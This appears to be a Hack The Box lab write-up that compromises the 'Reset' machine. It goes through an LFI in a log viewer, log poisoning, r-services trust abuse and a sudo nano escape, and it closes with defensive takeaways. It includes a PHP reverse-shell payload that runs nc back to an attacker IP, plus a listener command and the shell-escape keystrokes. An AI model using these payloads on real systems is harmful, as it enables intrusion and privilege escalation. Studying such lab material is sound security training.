# HTB Write-Up: Reset

| Field      | Details                                                       |
|------------|---------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Reset)     |
| Difficulty | Easy                                                          |
| OS         | Linux                                                         |
| Author     | samurai                                                       |
| Date       | April 14, 2026                                                |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration](#2-enumeration)
3. [Initial Access — Log Poisoning to RCE](#3-initial-access--log-poisoning-to-rce)
4. [Lateral Movement — R-Services Misconfiguration](#4-lateral-movement--r-services-misconfiguration)
5. [Privilege Escalation — Nano GTFOBin via Sudo](#5-privilege-escalation--nano-gtfobin-via-sudo)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed using **RustScan** for rapid discovery, followed by an aggressive **Nmap** scan for service and version fingerprinting.

```bash
rustscan -a 10.129.234.130 --ulimit 5000
nmap -A 10.129.234.130
```

**Open Ports:**

| Port | Service     | Version / Notes                          |
|------|-------------|------------------------------------------|
| 22   | SSH         | OpenSSH 8.9p1 (Ubuntu)                  |
| 80   | HTTP        | Apache 2.4.52 — "Admin Login" page       |
| 512  | rexec       | Netkit rexecd                            |
| 513  | rlogin      | Netkit rlogind                           |
| 514  | rsh         | Netkit rshd                              |

The presence of ports 512, 513, and 514 is immediately notable — these are legacy **Berkeley r-services** (rexec, rlogin, rsh), which are historically associated with trust-based authentication and are rarely seen in modern environments. This warrants close attention during the lateral movement phase.

---

## 2. Enumeration

### 2.1 — Admin Login Panel & Password Reset Leak

Port 80 hosts an admin login panel. Default credential attempts were unsuccessful. The application exposes a **Reset Password** endpoint, which was analysed by intercepting traffic in **Burp Suite**.

Upon clicking the reset button, the server responded with the newly generated password in plaintext:

```
HTTP/1.1 200 OK
Content-Type: application/json

{"username":"admin","new_password":"2392093d","timestamp":"2026-04-14 16:23:22"}
```

The API response directly returns the new credentials to the unauthenticated requester — a critical information disclosure vulnerability. These credentials granted immediate access to the admin dashboard.

### 2.2 — Log File Viewer (LFI Vector)

The admin dashboard included a **"View Logs"** feature. Intercepting this request revealed that the target file path was passed as a parameter:

```
POST /dashboard
...
file=/var/log/syslog
```

Modifying the `file` parameter to `/var/log/apache2/access.log` returned the contents of the Apache access log successfully, confirming a **Local File Inclusion (LFI)** vulnerability with no sanitisation applied.

---

## 3. Initial Access — Log Poisoning to RCE

With LFI confirmed and read access to the Apache access log, **Log Poisoning** was used to achieve Remote Code Execution.

### Step 1 — Inject PHP Payload via User-Agent

A malicious PHP reverse shell was injected into the access log by sending a crafted HTTP request with a weaponised `User-Agent` header:

```php
User-Agent: <?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 9090 >/tmp/f"); ?>
```

### Step 2 — Start Listener

```bash
rlwrap nc -lnvp 9090
```

### Step 3 — Trigger Execution

The LFI endpoint was called with `file=/var/log/apache2/access.log`, causing the PHP interpreter to execute the injected payload.

**Result — Shell obtained as `www-data`:**

```
connect to [10.10.15.33] from (UNKNOWN) [10.129.234.130] 57248
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@reset:/var/www/html$
```

---

## 4. Lateral Movement — R-Services Misconfiguration

### 4.1 — Discovering `/etc/hosts.equiv`

During post-exploitation enumeration, `/etc/hosts.equiv` was found to contain a trust configuration that permits the `sadm` user to connect via r-services **without a password**:

```
# /etc/hosts.equiv
- root
- local
+ sadm
```

The `+` prefix on `sadm` grants passwordless r-service access from any host for that username.

### 4.2 — Creating a Local `sadm` User and Connecting via rlogin

To exploit this, a local user named `sadm` was created on the attacker's machine and `rlogin` was used to authenticate:

```bash
sudo useradd sadm
sudo passwd sadm
su sadm
rlogin sadm@10.129.234.130
```

**Result — Shell obtained as `sadm`:**

```
sadm@reset:~$
```

The r-service trusted the username match alone, granting access without any credential verification against the target system.

---

## 5. Privilege Escalation — Nano GTFOBin via Sudo

### 5.1 — Discovering a Background tmux Session

Process enumeration revealed that the `sadm` user had an active, detached `tmux` session:

```
sadm  1210  tmux new-session -d -s sadm_session
```

The session was attached using the socket path:

```bash
tmux -S /tmp/tmux-1001/default attach -t sadm_session
```

This session contained the `sadm` user's credentials: `7lE2PAfVHfjz4HpE`.

### 5.2 — Sudo Enumeration

```bash
sudo -l
```

```
User sadm may run the following commands on reset:
    (ALL) PASSWD: /usr/bin/nano /etc/firewall.sh
    (ALL) PASSWD: /usr/bin/tail /var/log/syslog
    (ALL) PASSWD: /usr/bin/tail /var/log/auth.log
```

`sadm` is permitted to run `nano` as root on a specific file.

### 5.3 — Shell Escape via Nano (GTFOBins)

`nano` supports an **Execute Command** feature (`^R^X`) that can be used to break out to a shell when the process is running with elevated privileges. The following sequence was executed inside the sudo `nano` session:

```
sudo nano /etc/firewall.sh
```

Then, within nano:
```
^R^X
reset; bash 1>&0 2>&0
```

**Result — Root shell obtained:**

```
root@reset:~#
```

---

## 6. Summary

| Phase                   | Technique                                          | Result                          |
|-------------------------|----------------------------------------------------|---------------------------------|
| Recon                   | RustScan + Nmap (-A)                               | 5 open ports identified         |
| Enumeration             | Password reset API response leak                   | Admin credentials obtained      |
| LFI Discovery           | File path parameter manipulation                   | Arbitrary log file read         |
| Initial Access          | Log poisoning via User-Agent → PHP RCE             | Shell as `www-data`             |
| Lateral Movement        | `/etc/hosts.equiv` `sadm` trust + rlogin           | Shell as `sadm`                 |
| Credential Discovery    | tmux session hijacking                             | `sadm` password retrieved       |
| Privilege Escalation    | `sudo nano` GTFOBin shell escape (`^R^X`)          | Root shell                      |

### Key Takeaways

- **Never expose credentials in API responses.** The password reset endpoint returning the new password in the response body is a fundamental design flaw — the token should be delivered only to the registered email address.
- **LFI with log write access equals RCE.** Any file read vulnerability that can reach user-controlled input (such as HTTP headers written to access logs) can be escalated to code execution.
- **R-services are inherently dangerous.** `rlogin`, `rsh`, and `rexec` rely on hostname/username trust rather than cryptographic authentication. Their presence in any modern environment should be treated as a critical misconfiguration.
- **Sudo permissions on interactive editors are a root path.** Granting sudo access to editors like `nano`, `vim`, or `less` is equivalent to granting a root shell — these tools all support shell escape mechanisms documented publicly on GTFOBins.
